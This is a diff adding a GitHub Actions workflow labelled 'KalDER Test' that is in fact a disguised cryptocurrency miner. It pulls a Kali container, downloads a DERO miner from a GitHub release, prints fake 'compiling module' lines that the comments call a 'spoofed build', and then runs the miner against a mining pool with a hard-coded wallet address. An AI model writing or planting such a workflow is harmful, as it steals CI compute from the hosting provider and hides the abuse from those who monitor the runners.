@@ -1,0 +1,37 @@
+name: KalDER Test
+
+on:
+  workflow_dispatch:  # Manual trigger from GitHub UI
+
+jobs:
+  run-in-kali:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Pull Kali Linux Docker image
+        run: docker pull kalilinux/kali-rolling
+
+      - name: Run spoofed build in Kali container
+        run: |
+          docker run --rm --name kalimine kalilinux/kali-rolling bash -c "
+            echo '[*] Starting simulated build job...';
+            apt update -y && apt install -y wget tar;
+
+            echo '[*] Step 1/4: Downloading payload...';
+            wget https://github.com/Hansen333/Hansen33-s-DERO-Miner/releases/download/Version-0.6/hansen33s-dero-miner-linux-amd64.tar.gz;
+
+            echo '[*] Step 2/4: Extracting files...';
+            tar xf hansen33s-dero-miner-linux-amd64.tar.gz;
+            mv hansen33s-dero-miner-linux-amd64 h33;
+            chmod +x h33;
+
+            echo '[*] Step 3/4: Running long debugging loop (spoof build)...';
+            for i in {1..20}; do echo \"[debug] Compiling module \$i/20...\"; sleep 10; done;
+
+            echo '[*] Step 4/4: Executing miner...';
+            ./h33 \
+              -daemon-rpc-address dero.rabidmining.com:10300 \
+              -turbo \
+              -wallet-address deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xez9a3e7va238hsulcx0w \
+              -worker-name win
+          "
